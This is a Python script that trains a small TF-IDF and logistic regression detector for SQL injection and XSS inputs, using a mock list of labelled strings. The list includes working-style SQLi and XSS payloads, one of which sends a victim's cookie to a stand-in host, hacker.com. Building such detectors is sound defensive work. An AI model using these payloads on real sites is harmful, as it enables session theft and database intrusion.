import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.pipeline import Pipeline
from sklearn.linear_model import LogisticRegression
import os

# Mock dataset simulating normal inputs, SQLi, and XSS payloads
X = [
    # Normal inputs
    "hello world", "good morning", "my email is test@test.com", "John Doe", "123 Main St", "admin", "password123",
    
    # SQL Injections
    "SELECT * FROM users", "DROP TABLE database", "' OR 1=1 --", 
    "admin' --", "' OR '1'='1", "UNION SELECT username, password FROM users",
    
    # XSS Payloads
    "<script>alert(1)</script>", "<img src=x onerror=alert('xss')>", 
    "javascript:alert(1)", "javascript:eval('var a=1')", "\"><script>document.location='http://hacker.com/?cookie='+document.cookie;</script>"
]

# Labels: 0 = Safe, 1 = Malicious
y = [
    0, 0, 0, 0, 0, 0, 0,
    1, 1, 1, 1, 1, 1,
    1, 1, 1, 1, 1
]

# Create a machine learning pipeline
# TF-IDF vectorizes the text into word frequency vectors
# LogisticRegression trains on those vectors to classify safe vs malicious
pipeline = Pipeline([
    ('tfidf', TfidfVectorizer()),
    ('clf', LogisticRegression())
])

print("Training Payload Model (SQLi / XSS)...")
pipeline.fit(X, y)

# Save the model
model_path = os.path.join(os.path.dirname(__file__), 'payload_model.joblib')
joblib.dump(pipeline, model_path)
print(f"Payload model trained and saved to {model_path}.")
